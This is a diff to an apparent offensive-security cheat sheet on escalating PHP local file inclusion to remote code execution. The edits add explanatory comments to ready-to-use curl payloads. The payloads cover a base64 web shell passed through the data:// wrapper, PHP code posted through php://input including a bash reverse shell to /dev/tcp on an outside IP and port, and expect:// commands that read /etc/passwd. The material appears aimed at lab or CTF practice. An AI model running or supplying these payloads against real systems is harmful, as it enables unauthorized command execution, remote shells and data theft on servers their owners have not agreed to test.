@@ -4,10 +4,10 @@
 
 ## When You Get RCE From LFI
 
-PHP wrappers turn read-only LFI into RCE when:
-- The sink is `include()` / `require()` / `res.render()` (executes content)
-- `allow_url_include = On` (for `data://`, `php://input`, `http://` wrappers)
-- OR `expect` extension is loaded (for `expect://`)
+PHP wrappers turn read-only Local File Inclusion (LFI) into Remote Code Execution (RCE) when:
+- The sink is `include()`, `require()`, or `res.render()` (all execute content)
+- `allow_url_include = On` (needed for `data://`, `php://input`, and `http://` wrappers)
+- OR the `expect` extension is loaded (for `expect://`)
 
 If `allow_url_include = Off`, fall back to **log poisoning** (Section 6).
 
@@ -28,6 +28,7 @@ for ver in 8.4 8.3 8.2 8.1 8.0 7.4 7.3; do
   done
 done
 ```
+> Iterates over PHP versions and SAPI configurations to find a readable `php.ini`. When one is found, decodes it and extracts the three settings that control wrapper availability. Exits both loops once a hit is found.
 
 Decisions based on what you find:
 - `allow_url_include = On` → `data://` and `php://input` work
@@ -48,6 +49,7 @@ echo '<?php system($_GET["cmd"]); ?>' | base64
 # Exploit:
 curl -sk "http://TARGET/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id"
 ```
+> Base64-encodes the PHP web shell, then embeds it directly in the URL via the `data://` wrapper. The `cmd` parameter controls what OS command runs. Add `&cmd=id` for a quick test, then swap for any command you need.
 
 Requires `allow_url_include = On`. Sometimes fails if the app appends `.php` to the parameter (because `data://...;.php` is invalid). Workaround: use a wrapper that ignores trailing junk like `php://input`.
 
@@ -70,6 +72,7 @@ curl -sk -X POST --data '<?php system("id"); ?>' \
 curl -sk -X POST --data '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.17.176/4444 0>&1\""); ?>' \
   "http://TARGET/index.php?language=php://input"
 ```
+> Sends PHP code in the POST body. The `php://input` wrapper tells PHP to treat the POST body as a file to execute. The dynamic shell version is the most flexible — add `&cmd=ls` to run any command. Replace the IP and port in the reverse shell with your tun0 address and listener port.
 
 > **Why this often works when `data://` fails**: the appended `.php` (if any) gets tacked onto the wrapper name `php://input.php`, which PHP still recognizes as `php://input`.
 
@@ -83,6 +86,7 @@ Direct command execution — no PHP code needed. Requires the `expect` PHP exten
 curl -sk "http://TARGET/index.php?language=expect://id"
 curl -sk "http://TARGET/index.php?language=expect://cat%20/etc/passwd"
 ```
+> Runs an OS command directly via the `expect://` wrapper. No PHP shell code needed. Replace `id` with any command. URL-encode spaces as `%20` when the command has arguments.
 
 Check availability: grep `php.ini` for `extension=expect`. If present, try it — but presence in config doesn't guarantee the `.so` actually loads. Test directly.
 
